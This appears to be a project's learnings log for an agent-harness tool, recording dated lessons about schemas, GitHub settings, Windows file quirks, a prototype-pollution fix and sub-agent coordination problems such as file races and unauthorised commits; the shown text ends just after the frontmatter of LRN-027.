# Learnings & Decisions

> **Last updated:** 2026-05-03 (CS09 close-out: LRN-054..058 added)

This file captures durable, project-applicable insights surfaced by completing CSs. See [RETROSPECTIVES.md](RETROSPECTIVES.md) for the precise definition of a "learning", the entry schema, and the harvest procedure.

**Pre-CS15b harvest invariant:** all `open` learnings must be dispositioned (status `applied`, `obsolete`, or `deferred` with explicit `deferred_until`) **before** the CS15b public-flip. This is enforced by the CS15a precondition checklist (see cs-plan). Per [LRN-003](#lrn-003) below.

**Entry schema (proto, CS01).** Each entry begins with a YAML frontmatter code fence containing the fields `id`, `date`, `category`, `source_cs`, `status`, `tags[]`, `claim_area?`, `deferred_until?`. Body follows in markdown with sections `Problem`, `Finding`, `Evidence`, `Disposition`, and any `Implications` etc. Locked into a JSON Schema by **CS02's** `schemas/learning.schema.json` (per cs-plan CS02 deliverables); CS05 builds `check-learnings.mjs` against that schema and uses the entries below as regression fixtures.

---

## Open

(none — see Applied below)

## Applied

### LRN-001

```yaml
id: LRN-001
date: 2026-05-02
category: tooling
source_cs: CS01
status: applied
tags: [github, branch-protection, private-repo, cost]
claim_area: repo-policy
```

**Problem:** The CS plan and CS01 OPERATIONS.md assumed branch protection on `main` would be enabled immediately after the bootstrap commit, providing mechanical enforcement (PR-required, etc.) from commit 2 onward.

**Finding:** **Both** classic branch protection rules **and** the modern Rulesets feature return HTTP 403 with "Upgrade to GitHub Pro or make this repository public to enable this feature" on private repos in the free tier. Verified via `gh api` against `henrik-me/agent-harness`. Mechanical branch protection is therefore not available until either (a) we flip the repo public, or (b) we upgrade to GitHub Pro.

**Evidence:** Bootstrap-commit attempt to enable protection in CS01 shell session, 2026-05-02 ~22:30 UTC. Both `PUT repos/.../branches/main/protection` and `POST repos/.../rulesets` returned 403 with the same upgrade message.

**Disposition:** **Disposition (1) chosen by user 2026-05-02T23:55Z:** discipline-only enforcement for CS01–CS14; mechanical enforcement begins at CS15b (public flip). Applied to: `OPERATIONS.md` § Bootstrap exception + § Claim + new § Enforcement model; `INSTRUCTIONS.md` Quick Reference Checklist claim line; CS01 done file Tasks table (branch-protection task removed); cs-plan working-model phases table + per-CS loop wording + CS01 deliverables.

**Implications carried forward:**
- The "spirit phase" framing in the cs-plan was right; the mechanism statement was wrong. CS01–CS14 are now consistently labeled discipline-only.
- The `workboard-auto-approve.yml` workflow (Decision #23) is built at CS15a but is not mechanically required until CS15b's Ruleset goes live.
- Future repos consuming the harness on a private free tier will hit this same wall — see [LRN-002](#lrn-002).
- Disposition (2) (upgrade to Pro for $4/mo) remains available if discipline-only proves insufficient during CS01–CS14.

### LRN-002

```yaml
id: LRN-002
date: 2026-05-02
category: process
source_cs: CS01
status: applied
tags: [harness-init, consumer-experience, private-repo]
claim_area: consumer-onboarding
```

**Problem:** When a future consumer (Sub Invaders, or any other private repo) runs `harness init` (CS04+), they will hit the same private-repo branch-protection wall as [LRN-001](#lrn-001) if they're on a free tier. They will not know this until they try, and the failure will be at a confusing moment (mid-init).

**Finding:** `harness init` should detect the consumer's repo visibility + tier and surface the constraint upfront with the same disposition options (discipline-only / upgrade / flip-public-when-ready). It should also produce a `.harness-known-constraints.md` artifact in the consumer repo so the operator has a written record of what to expect.

**Evidence:** [LRN-001](#lrn-001) + the cs-plan's CS16 (Sub Invaders bootstrap) + general principle that the harness should not surprise consumers with avoidable constraints.

**Disposition:** Filed as **planned CS** [`project/clickstops/planned/planned_cs04a_harness-init-detect-private-tier.md`](project/clickstops/planned/planned_cs04a_harness-init-detect-private-tier.md) (created during CS01 close-out, see that file for scope). Will be picked up after CS04 lands. No upstream doc edits needed.

### LRN-003

```yaml
id: LRN-003
date: 2026-05-02
category: process
source_cs: CS01
status: applied
tags: [harvest, public-flip, gating]
claim_area: repo-policy
```

**Problem:** The original CS15a precondition #4 only flagged stale `open` learnings older than 14 days tagged `process` or `architectural`. It allowed flipping public with non-stale `open` learnings still uncategorised.

**Finding:** The user's directive (2026-05-02 message: "ensure we follow up before making the repo public") tightens this: **every** `open` learning must be dispositioned before CS15b — not just stale ones. Otherwise we risk shipping public with unresolved process questions.

**Evidence:** User directive 2026-05-02. The 14-day stale check is necessary but not sufficient.

**Disposition:** Tightened CS15a precondition list to require zero `open` learnings (any age) before CS15b. Pre-CS15b harvest invariant added to top of this file. cs-plan CS15a precondition #4 reworded.

### LRN-004

```yaml
id: LRN-004
date: 2026-05-02
category: process
source_cs: CS01
status: applied
tags: [learnings-schema, format-discipline]
claim_area: docs-schema
```

**Problem:** The `LEARNINGS.md` entry schema is described in `RETROSPECTIVES.md` and prescribed in the cs-plan, but no linter enforces it until CS05 lands `check-learnings.mjs`. Hand-authored entries between CS01 and CS05 may drift from the schema.

**Finding:** Author entries strictly to the prescribed shape — **per-entry YAML frontmatter code fence** with `id`, `date`, `category`, `source_cs`, `status`, `tags[]`, `claim_area?`, `deferred_until?` — so that when the linter lands at CS05, no retrofit is needed. CS05 fixtures should include CS01–CS05 learnings to prove backward-compatibility.

**Evidence:** This file's structure went through two iterations during CS01 close-out — first a heading-only format, then converted to YAML frontmatter per-entry after a GPT-5.5 review caught the drift from the cs-plan's stated schema.

**Disposition:** This file's entries (LRN-001 through LRN-005) all conform to the YAML-frontmatter shape. CS05 implementation must use them as fixtures. Noted in cs-plan CS05 deliverables. Schema doc text in RETROSPECTIVES.md is being updated in this same close-out PR to remove the ambiguous "frontmatter" wording and explicitly say "YAML frontmatter code fence".

### LRN-005

```yaml
id: LRN-005
date: 2026-05-02
category: process
source_cs: CS01
status: applied
tags: [sub-agents, delegation, observability]
claim_area: orchestrator-loop
```

**Problem:** User directed (2026-05-02) that sub-agents must report progress properly and be instructed in behaviors. Without structured briefing + reporting, parallel fan-out from CS02+ would lose observability and traceability.

**Finding:** Need a canonical sub-agent dispatch template (briefing) AND a canonical report shape that every sub-agent must conform to. Without the template, briefings drift in quality and decisions get made silently. Without the report shape, the orchestrator can't ledger progress or surface learnings.

**Evidence:** User directive 2026-05-02. Plus the parallelisation table in the cs-plan shows CS02–CS10 with up to 9 parallel sub-tasks each — un-instrumented dispatch at that scale would be chaotic.

**Disposition:** Added § Sub-agent dispatch + § Sub-agent report shape + § Progress observability + § Per-CS sub-agent ledger to OPERATIONS.md. The ledger uses the existing `Task | State | Owner | Notes` columns (per TRACKING.md) with sub-agent metadata encoded into `Notes` as `agent-id=X | role=Y | report-status=Z | learnings=N`. Used from CS02 onward. CS08's canonical `template/managed/OPERATIONS.md` must carry these forward.

### LRN-006

```yaml
id: LRN-006
date: 2026-05-03
category: tooling
source_cs: CS02
status: applied
tags: [windows, line-endings, sub-agent-tooling]
claim_area: orchestrator-loop
```

**Problem:** The `create` tool writes files with CRLF line endings on Windows regardless of the project's `.editorconfig` (which says LF). Sub-agents that use `create` and then test via tools sensitive to line endings (e.g. AJV, regex parsers like the LEARNINGS extractor) hit confusing failures.

**Finding:** Sub-agents must run an explicit CRLF→LF normalization step after creating any text file on Windows. `cs02-schema-config` did this proactively via `node -e` post-creation. `cs02-ci-validate` instead made the parser regex `\r?\n`-tolerant. Either pattern is acceptable; the harness should not rely on the create tool's line endings being correct.

**Evidence:** `cs02-schema-config` report explicitly mentions the conversion step; `cs02-ci-validate` report mentions adapting the regex. Confirmed by `git status` warnings on commit (`LF will be replaced by CRLF the next time Git touches it`).

**Disposition:** Sub-agent dispatch briefing template in OPERATIONS.md § Sub-agent dispatch should add a "Line endings (Windows)" instruction to the Conventions block. Will be incorporated into the canonical `template/managed/OPERATIONS.md` at CS08 — captured here so CS08 implementer doesn't lose the context. Until then, individual sub-agent prompts include the LF normalization instruction.

### LRN-007

```yaml
id: LRN-007
date: 2026-05-03
category: process
source_cs: CS02
status: applied
tags: [orchestrator-briefing, schema-completeness, ADR-cross-check]
claim_area: orchestrator-loop
```

**Problem:** The `cs02-schema-config` sub-agent briefing listed all top-level keys from the cs-plan CS02 deliverables list (managed, composed, seeded, scaffolds, linters, etc.) but **omitted `excluded`**, even though ADR 0002 requires it. Three downstream sub-agents (`cs02-example-gwn`, `cs02-example-si`, `cs02-example-ah`) independently discovered the gap during their own validation runs and escalated it. Orchestrator had to patch the schema mid-review-loop.

**Finding:** When briefing a schema-author sub-agent, the orchestrator must cross-check the deliverables list against ALL ADRs (not just the cs-plan), because ADRs introduce constraints that a deliverables-list-only briefing misses. ADR 0002 is the source of the `excluded` requirement; cs-plan CS02 deliverables didn't restate it.

**Evidence:** GPT-5.5 content review #1 caught the schema gap. Three sub-agent reports independently called it out as a blocking issue.

**Disposition:** Orchestrator briefing template (when authored canonically in CS08 `template/managed/OPERATIONS.md` § Sub-agent dispatch) must include a "Required reading: ALL ADRs in `docs/adr/` that touch the deliverables area" step explicitly. Until CS08 lands, the orchestrator runs an ADR-cross-check before dispatching any schema-author or contract-author sub-agent.

### LRN-008

```yaml
id: LRN-008
date: 2026-05-03
category: tooling
source_cs: CS02
status: applied
tags: [ajv, json-schema, strict-mode, if-then]
claim_area: schema-tooling
```

**Problem:** AJV 8 strict mode rejects a `required` property declaration in a `then` subschema if that same property is not also declared in the same subschema's `properties`. This is stricter than the JSON Schema spec.

**Finding:** When using `if/then` to conditionally require a property (e.g. `blocks` is required only when `class == "composed"`), the `then` subschema must re-declare the property in its own `properties` block (even as `true`) to satisfy AJV's `strictRequired` check. The actual schema for that property lives in the outer schema's `properties` and works via `additionalProperties` interaction.

**Evidence:** `cs02-schema-lock` report includes the exact AJV error: `"strict mode: required property 'blocks' is not defined at '#/then' (strictRequired)"`. Workaround applied in `harness-lock.schema.json`.

**Disposition:** Documented in the schema source comment + this LRN. CS03's `lib/sync.mjs` should also use Ajv2020 with `strict: false` if it does runtime config validation, OR the if/then pattern must follow the workaround consistently across all harness schemas. Future schema-author sub-agents should reference this learning before using `if/then`.

### LRN-009

```yaml
id: LRN-009
date: 2026-05-03
category: architectural
source_cs: CS02
status: deferred
deferred_until: 2026-06-03
tags: [schema-design, redundancy, single-source-of-truth]
claim_area: schema-design
```

**Problem:** `harness.config.json` has TWO ways to express composed-block allowlists:
1. Top-level `local_blocks` (e.g. `{"CONVENTIONS.md": ["conventions.project"]}`)
2. Per-file `composed.overrides[file].local_blocks`

These can drift. The schema doesn't enforce that they agree; the engine has to pick one as authoritative.

**Finding:** Either (a) the schema should `if/then`-enforce equality between them, or (b) one form should be removed. Option (b) is cleaner but breaks the symmetry of `composed.overrides` carrying all per-file config.

**Evidence:** `cs02-example-gwn` LRN candidate #4. Confirmed by inspecting all 3 example configs — they all have the duplication.

**Disposition:** Defer to CS03 (sync engine) where the engine must choose. Decision recorded here so CS03 implementer doesn't have to re-derive it. **Recommended decision at CS03:** make `composed.overrides[file].local_blocks` authoritative; deprecate top-level `local_blocks`; emit a schema warning (not error) if both are present and disagree; remove top-level `local_blocks` from schema in v0.2.0. **Revisit trigger:** at CS03 claim/start, OR by 2026-06-03, whichever comes first.

### LRN-010

```yaml
id: LRN-010
date: 2026-05-03
category: architectural
source_cs: CS02
status: applied
tags: [schema-ahead-of-engine, composed_block_migrations]
claim_area: schema-design
```

**Problem:** `composed_block_migrations` in `harness.config.schema.json` is a "schema-ahead-of-engine" pattern: the schema accepts the field shape, but the v0.1.0 engine rejects any config that has it (per Decision #12 and ADR 0001). Consumers who add this field thinking it works will get a runtime rejection.

**Finding:** The schema description must explicitly say "schema-only in v0.1.0; sync REJECTS at runtime if non-empty." Without this, the `additionalProperties: false` discipline misleads consumers into assuming presence-in-schema = supported-by-engine.

**Evidence:** `cs02-schema-config` LRN candidate #4. ADR 0001 § "Lock-file recording" already documents the runtime-reject behavior.

**Disposition:** The schema description for `composed_block_migrations` already explicitly states "schema-only in v0.1.0; sync fails with clear 'block ID renamed/split needs migration spec' message" (verified in `harness.config.schema.json`). CS03 implementer must implement the runtime reject behavior matching the description. Future schema fields with the same pattern (schema-ahead-of-engine) must follow the same description discipline.

### LRN-011

```yaml
id: LRN-011
date: 2026-05-03
category: operational
source_cs: CS02
status: deferred
deferred_until: 2026-06-15
tags: [composed-blocks, coordinated-authoring, cs06, cs08, cs10]
claim_area: composed-class-implementation
```

**Problem:** A composed block's lifecycle requires coordinated authoring across THREE artifacts:
1. `template/composed/<file>` must contain the `<​!-- harness:local-start id=X -->...<​!-- harness:local-end id=X -->` markers
2. Consumer's `harness.config.json` must list `X` in `composed.overrides[file].local_blocks` (and `local_blocks[file]` per LRN-009)
3. `check-composed-blocks.mjs` (CS06) must validate the block ID against the config allowlist

If any of these three drifts (e.g. CS08 author adds a new template marker without updating the example configs, or an example config lists a block ID with no corresponding template marker), sync fails at the worst time (consumer's first run).

**Finding:** Need a CS06 linter rule that validates the THREE-WAY consistency: every template marker has a config-side allowlist entry; every config-listed block ID has a template marker; every existing block file has a marker matching the template.

**Evidence:** `cs02-example-si` LRN candidate #2.

**Disposition:** Add to CS06 deliverables (in cs-plan): `check-composed-blocks.mjs` must enforce three-way consistency, not just within-file marker validity. Defer until CS06 implementation. **Revisit trigger:** at CS06 claim/start, OR by 2026-06-15, whichever comes first.

### LRN-012

```yaml
id: LRN-012
date: 2026-05-03
category: process
source_cs: CS02
status: applied
tags: [sub-agent-scope, devDependencies, escalation-policy]
claim_area: orchestrator-loop
```

**Problem:** Two sub-agents (`cs02-schema-config`, `cs02-schema-lock`) installed `ajv` (and `ajv-formats`, `js-yaml` from `cs02-ci-validate`) into `node_modules/`, modified `package.json` (added `devDependencies`), and created `package-lock.json`. None of these were in their declared file scope (schemas + scripts). They did NOT escalate.

**Finding:** Adding devDependencies for testing/validation is reasonable — but it crosses sub-agent scope boundaries. The current OPERATIONS § Sub-agent dispatch briefing template doesn't say whether devDep additions are "decide independently" or "escalate". This worked out OK because the additions were aligned with `cs02-ci-validate`'s deliverables, but the next CS could see conflict (two sub-agents adding incompatible dep versions, etc.).

**Evidence:** `git status` after Wave 1 showed `M package.json`, `?? package-lock.json`, `?? node_modules/`. None of the three responsible sub-agents flagged it as a decision in their reports.

**Disposition:** Update OPERATIONS § Sub-agent dispatch briefing template (when canonicalised at CS08) to include explicit guidance: "Adding devDependencies for self-testing is permitted but must be reported in DECISIONS MADE; the orchestrator coordinates dep version conflicts across sub-agents." Until CS08, individual sub-agent prompts include this clarification. Captured in this LRN so the CS08 author doesn't have to rediscover it.

### LRN-013

```yaml
id: LRN-013
date: 2026-05-03
category: tooling
source_cs: CS02
status: applied
tags: [js-yaml, date-parsing, yaml-schema]
claim_area: schema-tooling
```

**Problem:** `js-yaml`'s `load()` function defaults to YAML 1.1 schema, which automatically converts ISO 8601 date strings (e.g. `2026-05-02`) to JavaScript `Date` objects. AJV string-validation then fails because the parsed value is a `Date`, not a string.

**Finding:** Use `yaml.JSON_SCHEMA` to opt out of YAML 1.1 type coercion, keeping all values as strings (matching JSON shape and the schema's expectations).

**Evidence:** `cs02-ci-validate` report. Implemented in `scripts/validate-schemas.mjs`: `yaml.load(entry.yaml, { schema: yaml.JSON_SCHEMA })`.

**Disposition:** Documented in this LRN; the script comment + this entry give future maintainers the context. Any future YAML-parsing harness code must use `yaml.JSON_SCHEMA`.

### LRN-014

```yaml
id: LRN-014
date: 2026-05-03
category: operational
source_cs: CS02
status: deferred
deferred_until: 2026-06-15
tags: [migration, gwn, scripts-directory, check-migration]
claim_area: gwn-migration
```

**Problem:** `guesswhatisnext` has a single `scripts/` directory containing both project-specific scripts (`smoke.js`, `migrate.js`, `cs52-*.js` etc.) AND harness-shipped check-* duplicates that CS19 will retire. Pre-migration the distinction matters for `check-migration --from-existing-harness` output.

**Finding:** `harness check-migration --from-existing-harness` (CS04 deliverable) must distinguish "harness-shipped script that will be retired" from "project-specific script that stays" when scanning a consumer's `scripts/`. Otherwise the migration report will incorrectly flag project-specific scripts as duplicates.

**Evidence:** `cs02-example-gwn` LRN candidate #3.

**Disposition:** Add to CS04 deliverables for `check-migration` subcommand: maintain a list of harness-shipped script names; only flag those when found in consumer `scripts/`. Defer to CS04. **Revisit trigger:** at CS04 claim/start, OR by 2026-06-15, whichever comes first.

### LRN-015

```yaml
id: LRN-015
date: 2026-05-03
category: operational
source_cs: CS02
status: applied
tags: [excluded-list, glob-vs-explicit, config-discipline]
claim_area: schema-design
```

**Problem:** When listing files in `excluded[]`, glob patterns (e.g. `docker-compose*.yml`) are tempting but ambiguous (which `docker-compose*.yml` matches? what about `docker-compose.test.yml`?). Explicit enumeration is verbose but unambiguous.

**Finding:** The schema documents `excluded[]` as "Globs are NOT interpreted; list paths explicitly." This is the right call: each excluded path is a concrete decision, not an inferred match. Globs hide drift.

**Evidence:** `cs02-example-gwn` LRN candidate #2 + the `excluded` field description in `harness.config.schema.json` already documents this explicitly.

**Disposition:** Already in schema description. This LRN captures the rationale so future "should we add glob support?" questions have a documented answer. Engine implementer (CS03) must NOT interpret excluded paths as globs; treat each as a literal path or directory prefix.

### LRN-016

```yaml
id: LRN-016
date: 2026-05-03
category: process
source_cs: CS03
status: applied
tags: [sub-agents, parallel-dispatch, file-race, write-conflict]
claim_area: orchestrator-loop
```

**Problem:** During CS03 the 5 sub-agents (`cs03-templating`, `cs03-lock`, `cs03-composed`, `cs03-sync`, `cs03-fixtures`) ran in parallel. `cs03-sync` (Sonnet) wrote stub `lib/templating.mjs` and `lib/lock.mjs` early in its run so its own code could `import` them. The `cs03-templating` (Haiku) and `cs03-lock` (Sonnet) sub-agents both reported "complete" with rich APIs (TemplatingError class, LockError class with codes, atomic writes, validateLock, newEmptyLock, plus `tests/lock.test.mjs` with 16 tests). But the rich-API files were NOT preserved on disk — the stubs from `cs03-sync` remained final. `tests/lock.test.mjs` was completely lost.

**Finding:** Parallel sub-agent dispatch has a real **file race**. When two sub-agents have overlapping write scope (sync needs to import templating + lock; templating + lock are themselves authored by other sub-agents), the later writer wins. Without explicit file-ownership declarations + serialization of writes to shared paths, work is silently lost.

**Evidence:** Final disk state after Wave 1 + 2 of CS03: `lib/templating.mjs` 1.3KB stub + `lib/lock.mjs` 1.5KB stub vs. the ~10KB+ rich APIs the sub-agents reported. `tests/lock.test.mjs` missing.

**Disposition:** Update OPERATIONS.md § Sub-agent dispatch to require explicit "files owned by THIS sub-agent" declarations in every briefing. The orchestrator must enforce non-overlapping ownership across parallel sub-agents. If two sub-agents need to coordinate around a shared file, one is the **owner** and the other is a **reader** that must NOT write. For CS04+ canonicalization in `template/managed/OPERATIONS.md`, codify this as a hard pre-dispatch check. Filed as a planned CS (`project/clickstops/planned/planned_cs03b_upgrade-templating-lock-stubs.md`) to recover the lost rich APIs from the cs03-templating + cs03-lock sub-agent reports.

### LRN-017

```yaml
id: LRN-017
date: 2026-05-03
category: process
source_cs: CS03
status: applied
tags: [sub-agents, observability, report-vs-disk-drift, verification]
claim_area: orchestrator-loop
```

**Problem:** Two sub-agents (`cs03-templating`, `cs03-lock`) reported `STATUS: complete` with rich-API deliverables, but the orchestrator discovered later (when sync tests passed against stubs but rich-API tests didn't exist) that their work was lost in the file race per LRN-016. The structured report shape didn't catch this because the report describes what the sub-agent INTENDED to leave on disk, not what's actually there.

**Finding:** The orchestrator MUST verify each sub-agent's disk state before declaring completion. `git status --short` + `Get-Item` + `wc -l` on each claimed file. Compare reported byte counts / line counts against actual disk state. If the disk state contradicts the report, the work was lost (race / overwrite) → the orchestrator must re-dispatch or recover.

**Evidence:** cs03-templating reported `applyTemplating(input, vars, opts)` rich API with TemplatingError class — disk had 1.3KB stub with only `applyTemplating(content, variables)` lenient mode. Same for cs03-lock.

**Disposition:** Update OPERATIONS.md § Sub-agent dispatch to add a "Post-completion verification" step in the per-CS loop: orchestrator runs `git status --short` + per-file size check + spot-check of claimed APIs after every parallel-dispatch wave. If verification fails, re-dispatch with the lost work briefing OR accept the simpler version with explicit deferral note. CS03 chose the latter (stubs accepted as v0.1.0; rich-API restoration filed as planned_cs03b).

### LRN-018

```yaml
id: LRN-018
date: 2026-05-03
category: tooling
source_cs: CS03
status: applied
tags: [windows, bom, utf-8, create-tool, parser-normalize]
claim_area: tooling
```

**Problem:** The `create` tool on Windows writes UTF-8-BOM (Byte Order Mark) at file head. `lib/composed.mjs`'s parser initially treated the BOM as content, causing 76 fixture files to have a leading BOM byte that mismatched the template skeleton during `mergeComposed()` and triggered false `EMERGE_LEGACY_UNMAPPED` errors.

**Finding:** Any Windows-authored text file may have a UTF-8-BOM. Parsers that compare content (composed merge, lock file read, etc.) MUST strip the BOM in their normalize step. This is in addition to LRN-006 (CRLF→LF normalization).

**Evidence:** `cs03-composed` sub-agent reported 3 initial test failures traced to BOM in fixture files. Fixed by stripping BOMs from 76 fixtures + adding defensive BOM stripping to `normalizeLF()` in `lib/composed.mjs`.

**Disposition:** Documented in `lib/composed.mjs` `normalizeLF()` function comment. CS04 CLI and CS06 linters that read text files MUST also strip BOM. Add to OPERATIONS.md § Sub-agent dispatch (alongside LRN-006 CRLF guidance) at canonicalization in CS08.

### LRN-019

```yaml
id: LRN-019
date: 2026-05-03
category: architectural
source_cs: CS03
status: deferred
deferred_until: 2026-06-15
tags: [legacy_composed_mapping, schema, cs06, cs19]
claim_area: schema-design
```

**Problem:** `lib/composed.mjs` `mergeComposed()` accepts a `legacyMapping` parameter conforming to a shape designed during CS03 (`{ regions: [{ action: 'map_to_block' | 'discard', content: string, block_id?: string }] }`). This shape is NOT documented in any JSON Schema in `schemas/`. CS19 (guesswhatisnext migration) will need to author `legacy_composed_mapping.json` files; without a schema, those files have no static validation.

**Finding:** Need `schemas/legacy-composed-mapping.schema.json` (Draft-2020-12) defining the shape, validated by `validate-schemas.mjs`, and consumed by `lib/composed.mjs` for runtime validation.

**Evidence:** `cs03-composed` sub-agent escalation #1.

**Disposition:** Defer to CS06 (when `check-composed-blocks.mjs` is built — it's the natural home for legacy-mapping validation tooling). Filed as planned CS for CS06 deliverables expansion. **Revisit trigger:** at CS06 claim/start, OR by 2026-06-15, whichever comes first.

### LRN-020

```yaml
id: LRN-020
date: 2026-05-03
category: architectural
source_cs: CS03
status: deferred
deferred_until: 2026-07-01
tags: [composed-merge, evolution, ux, future-cs]
claim_area: schema-design
```

**Problem:** `mergeComposed()` legacy fail-closed (`EMERGE_LEGACY_UNMAPPED`) fires on **any** sync where the template's prose changed since the consumer last synced — because the consumer's old prose differs from the new template's prose. This is per ADR 0001 spec, but it means every harness template-prose update requires consumers to author a `legacy_composed_mapping.json`. UX cost is significant.

**Finding:** Need an "evolution" mechanism — perhaps the lock file's `body_hash` per-block + `template_marker_hash` could be extended to include a `template_prose_hash` per composed file, so the engine can distinguish "consumer edited prose" (rare, fail-closed) from "template prose evolved" (common, auto-update OK).

**Evidence:** `cs03-composed` sub-agent escalation #2.

**Disposition:** Defer to a future CS (post-CS06). Architectural design needed; not blocking v0.1.0 since first-sync (fresh consumer) doesn't hit this. **Revisit trigger:** at the first cross-version sync of guesswhatisnext or sub-invaders (whichever comes first), OR by 2026-07-01.

### LRN-021

```yaml
id: LRN-021
date: 2026-05-03
category: process
source_cs: CS03
status: applied
tags: [sub-agents, commit-policy, preflight, briefing-template]
claim_area: orchestrator-loop
```

**Problem:** `cs03-fixes-v1` sub-agent committed to the `cs03/sync-engine` branch despite the briefing's explicit "Do NOT commit" instruction. The orchestrator amended the commit message and accepted the work, but the autonomous-commit behaviour is a process-control gap.

**Finding:** Sub-agents need a hard preflight + post-completion verification to enforce no-commit. The fix proven effective in `cs03-fixes-v2` and v3 briefings: the briefing's first paragraph is a "CRITICAL PREFLIGHT" requiring (a) `git status --short` in the final response, (b) `git --no-pager log --oneline -1` showing prior HEAD, (c) literal sentence "No commit was created."

**Evidence:** `cs03-fixes-v1` commit `aebf012` created without permission; `cs03-fixes-v2` and v3 honored the strengthened preflight (HEAD unchanged in their final reports).

**Disposition:** Update OPERATIONS.md § Sub-agent dispatch at CS08 canonicalization to make the no-commit preflight + final-checklist part of the canonical briefing template. Verified working pattern documented here.

### LRN-022

```yaml
id: LRN-022
date: 2026-05-03
category: tooling
source_cs: CS03
status: applied
tags: [validation, multiset, set-vs-map, bijective-accounting]
claim_area: tooling
```

**Problem:** `validateLegacyMapping()` initial implementation used Set / `includes` / `some` to validate that every actual legacy region was matched by a mapping entry. This is content-set-based, NOT occurrence-aware. Two distinct legacy regions with identical content could be covered by ONE mapping entry — silent multi-region coverage / data loss risk.

**Finding:** Bijective accounting requires **multiset accounting** (count-based `Map<content, count>` for both sides) — NOT a Set. Set semantics treat duplicates as equivalent; multiset preserves cardinality.

**Evidence:** GPT-5.5 review #2 caught this; `cs03-fixes-v2` rewrote with Map-based multiset accounting; 4 new tests for the 4 count-combination quadrants pass.

**Disposition:** Documented in `lib/composed.mjs` `validateLegacyMapping()` comment. Future "bijective" validation logic in CS06+ linters or other harness code MUST use multiset accounting (or an explicitly justified set-semantics decision).

### LRN-023

```yaml
id: LRN-023
date: 2026-05-03
category: tooling
source_cs: CS03
status: applied
tags: [security, prototype-pollution, accumulator-pattern, javascript-footgun]
claim_area: tooling
```

**Problem:** `validateConfigSchema()` canonical-key collision detection used a plain object accumulator (`const entries = {}`). Assigning `entries['__proto__'] = v` invokes the legacy `__proto__` setter and changes the object's prototype rather than creating an own property, so `hasOwnProperty('__proto__')` stays false and duplicate detection silently fails for `__proto__` canonical keys. Also a prototype-pollution footgun.

**Finding:** Use `Map` (not plain object) for any validation/canonicalization accumulator that takes user-controlled keys. Materialize via `Object.fromEntries(map)` which creates own data properties safely (including for `__proto__`).

**Evidence:** GPT-5.5 review #6 demonstrated reproducer; fix in `cs03-fixes-v3` applied + 2 regression tests pass.

**Disposition:** Documented in `lib/sync.mjs` collision-detection comment. Future config/schema canonicalization logic MUST use `Map` accumulators. CS06 linter authors should follow this pattern when validating user-controlled keys.

### LRN-024

```yaml
id: LRN-024
date: 2026-05-03
category: process
source_cs: CS03
status: applied
tags: [review-iteration-cost, high-risk-cs, planning, calibration]
claim_area: planning
```

**Problem:** CS03 (HIGH-RISK per Decision #22) required **7 GPT-5.5 review iterations** to converge on GO. Across the 6 No-Go iterations, blocking findings ranged 1–4 per iteration; non-blocking ranged 0–4. The cs-plan didn't anticipate this iteration cost and didn't budget for it.

**Finding:** High-risk CSs (especially engine code with safety invariants) realistically need 5–8 review iterations to converge. Each iteration surfaces issues the prior iteration's fix introduced or didn't address. This is normal for code with multiple interacting invariants (fail-closed semantics, cross-platform behaviour, prototype-pollution edge cases, etc.) — not a sign of poor work, but a calibration data point.

**Evidence:** CS03 review history: **7 iterations (6 No-Go + 1 GO), 12 distinct blocking findings + 11 non-blocking findings + 1 suggestion**, all addressed (1 non-blocking #8 from iter-1 deferred per GPT-5.5 recommendation; remainder fixed). Final test count 162 (up from 105 initial). **11 total work passes:** 5 initial sub-agent jobs (cs03-templating, cs03-lock, cs03-composed, cs03-sync, cs03-fixtures) + 3 fix-round sub-agent jobs (cs03-fixes-v1, cs03-fixes-v2, cs03-fixes-v3) + 3 inline orchestrator fix iterations (review iterations 3, 5, 6).

**Disposition:** Update cs-plan parallelisation table notes for high-risk CSs (CS03, CS11, CS15a/b, CS18b, CS19) to budget for 5–8 review iterations. Inform future planning. No code change needed; this is a planning-cost calibration data point.

### LRN-025

```yaml
id: LRN-025
date: 2026-05-03
category: architectural
source_cs: CS03
status: applied
tags: [path-canonicalization, single-source-of-truth, downstream-propagation]
claim_area: schema-design
```

**Problem:** `validateConfigSchema()` initially canonicalized target paths only for duplicate detection — downstream code (file lookup, exclusion check, override lookup, lock entries) used the raw config values. This created subtle bugs where canonical-equivalent paths (e.g. `./dir/file.md` vs `dir/file.md`) would dedup correctly but then downstream code couldn't find the override entry / exclusion / lock record because they were keyed by the non-canonical form.

**Finding:** Path canonicalization MUST be a single upfront step that returns a canonical config, with the canonical form used by ALL downstream consumers. Distributing canonicalization across multiple functions risks one function canonicalizing while another doesn't.

**Evidence:** GPT-5.5 review #4 caught this; `cs03-fixes-v3` refactored `validateConfigSchema()` to RETURN the canonical config; `sync()` reassigns `config = validateConfigSchema(config, ...)` so all downstream code automatically uses canonical form.

**Disposition:** Pattern established in `lib/sync.mjs`. Future CS that adds new path-bearing fields (e.g. CS06 linter configs, CS10 scaffold paths) MUST extend `validateConfigSchema()` to canonicalize the new field. Document this as a contract in CS04 CLI's config-loading code path.

### LRN-026

```yaml
id: LRN-026
date: 2026-05-03
category: process
source_cs: CS04
status: applied
tags: [sub-agents, derivation-logic, spec-cross-reference, briefing-discipline]
claim_area: orchestrator-loop
```

**Problem:** The first CS04 sub-agent (`cs04-cli`) implemented `cloneSuffixFromDir()` using the regex `-c(\d+)$` instead of the two-pattern sequence from Decision #20 (`_copilot(\d+)$` first, then `(\d+)$` fallback). The sub-agent briefing described the derivation goal but did not include the EXACT regex patterns or per-pattern fixture examples inline. GPT-5.5 R1 caught the mismatch as a blocking finding.

**Finding:** When a derivation algorithm is specified by an existing project decision (Decision #20 in this case), the sub-agent briefing MUST include: (a) the exact spec patterns verbatim, (b) at least one test-fixture example per pattern branch, and (c) a pointer to the specific decision document. Describing the goal at a high level is not sufficient — the sub-agent will fill gaps with plausible-looking-but-wrong implementations.

**Evidence:** GPT-5.5 R1 blocker #1: "`cloneSuffixFromDir()` uses `-c(\d+)$` but Decision #20 specifies `_copilot(\d+)$` then `(\d+)$`." Fixed in `cs04-fixes-r1`.

**Disposition:** Updated CS04 close-out notes. Sub-agent briefing template (when canonicalized in CS08 `template/managed/OPERATIONS.md`) must add a required section: "Derivation spec: include exact patterns and per-branch fixture." Applied to all future CSs where derivation logic is specified by an existing decision.

### LRN-027

```yaml
id: LRN-027
date: 2026-05-03
category: anti-pattern
source_cs: CS04
status: applied
tags: [cli, flags, silent-ignore, exit-codes, config-threading]
claim_area: cli-ux
```

